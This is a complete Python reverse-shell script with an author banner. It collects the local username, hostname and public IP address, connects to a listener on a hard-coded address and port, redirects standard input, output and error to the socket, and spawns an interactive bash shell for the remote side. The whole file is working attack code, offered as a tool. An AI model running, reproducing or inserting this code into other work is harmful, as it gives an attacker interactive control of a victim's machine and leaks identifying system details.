#!/usr/bin/env python3

try:
    from subprocess import call
    from sys import exit
    from os import dup2
    import requests
    import socket
    import time
    import pwd
    import os

except ImportError:
    raise RuntimeError("Important modules are missing. Exit!")


# # # # # # # # # # # # # # # # # # # # # #
#                                         #
#   Author  :   Keyjeek                   #
#   Contact :   nomotikag33n@gmail.com    #
#   Github  :   @Keyj33k                  #
#   Version :   1.0.7                     #
#                                         #
# # # # # # # # # # # # # # # # # # # # # #

g = "\033[0;32m"
w = "\033[0;37m"
r = "\033[0;31m"
o = "\033[0;93m"


class ReverseShell:

    def __init__(
            self,
            remote_username: str,
            remote_hostname: str,
            remote_ipv4_address: str,
            public_ipv4_address: str,
            remote_port: int
    ):
        self.remote_hostname = remote_hostname
        self.remote_username = remote_username
        self.public_ipv4_address = public_ipv4_address
        self.remote_ipv4_address = remote_ipv4_address
        self.remote_port = remote_port

    def shell(self):
        with socket.socket(
                socket.AF_INET,
                socket.SOCK_STREAM
        ) as socket_sock:
            socket_sock.connect((
                self.remote_ipv4_address,
                self.remote_port
            ))

            socket_sock.send(f"\n{w}[{r}*{w}] Connected to {self.public_ipv4_address}!".encode())
            socket_sock.send(f"\n{w}[{r}*{w}] Start interacting with target ...".encode())

            time.sleep(1.75)

            socket_sock.send(
                f"\n{w}[{g}+{w}] You are now connected".encode() +
                f" to {self.remote_username}'s machine {self.remote_hostname} ".encode()
            )
            socket_sock.send(
                f"\n{w}[{r}*{w}] Starting reverse shell to {self.remote_hostname} ...".encode())

            time.sleep(1.75)

            dup2(
                socket_sock.fileno(),
                0
            )  # return stream integer file descriptor
            dup2(
                socket_sock.fileno(),
                1
            )  # used for request I/O actions from the OS
            dup2(
                socket_sock.fileno(),
                2
            )

            socket_sock.send(f"\n{w}[{g}+{w}] Successfully ".encode() +
                             f"started a reverse shell to {self.remote_username}'s machine!\n\n".encode())

            call([
                "/bin/bash",
                "-i"
            ])


if __name__ == "__main__":
    call(["clear"])

    try:
        remote_connection = ReverseShell(
            pwd.getpwuid(os.getuid())[0],
            socket.gethostname(),
            "127.0.0.1",
            requests.get('https://api.ipify.org').text,
            5003
        )

        remote_connection.shell()
    except ConnectionRefusedError:
        print(f"{w}[{o}-{w}] Connection failed: server may be offline?")
        exit(1)
